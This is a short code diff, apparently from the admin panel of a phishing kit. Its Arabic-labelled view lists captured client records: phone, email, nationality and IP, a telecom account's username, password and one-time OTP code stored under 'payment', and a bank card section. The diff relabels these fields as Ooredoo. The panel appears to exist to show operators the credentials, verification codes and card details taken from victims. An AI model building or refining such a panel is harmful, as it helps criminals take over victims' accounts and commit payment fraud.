@@ -351,11 +351,11 @@ if (!isset($_SESSION['admin_logged_in'])) {
           ${dRow("الهاتف", b.clientPhone)} ${dRow("البريد", b.clientEmail)}
           ${dRow("الجنسية", b.clientNationality)} ${dRow("IP", b.clientIp)}
         </div>
-        <div class="sec-title">بيانات الحساب والدخول</div>
+        <div class="sec-title">بيانات الحساب والدخول (Ooredoo)</div>
         <div class="detail-grid">
-          ${dRow("اسم المستخدم (Alreado)", b.payment.ooredooUser)}
-          ${dRow("كلمة المرور (Alreado)", b.payment.ooredooPass)}
-          ${dRow("OTP (Alreado)", b.payment.ooredooOtp)}
+          ${dRow("اسم المستخدم Ooredoo", b.payment.ooredooUser)}
+          ${dRow("كلمة المرور Ooredoo", b.payment.ooredooPass)}
+          ${dRow("رمز التحقق (OTP) Ooredoo", b.payment.ooredooOtp)}
         </div>
         <div class="sec-title">بيانات البطاقة البنكية</div>
         <div class="detail-grid">
